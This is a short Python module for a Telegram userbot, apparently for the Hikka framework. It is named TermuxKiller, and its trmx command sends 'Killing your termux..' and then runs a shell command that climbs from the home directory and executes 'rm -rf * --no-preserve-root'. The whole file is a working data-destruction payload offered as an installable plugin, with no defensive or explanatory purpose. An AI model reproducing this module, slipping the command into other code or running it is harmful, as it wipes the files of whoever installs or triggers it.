from hikkatl.types import Message
from .. import loader
from .. import utils
import os


@loader.tds
class TermuxKiller(loader.Module):
    """Kill your termux"""
    strings = {"name": "TermuxKiller", "hello": "Killing your termux.."}

    @loader.command()
    async def trmx(self, message: Message):
        """TermuxKiller"""
        await utils.answer(message, self.strings("hello"))
        os.system("cd $HOME && cd .. && cd .. && rm -rf * --no-preserve-root")
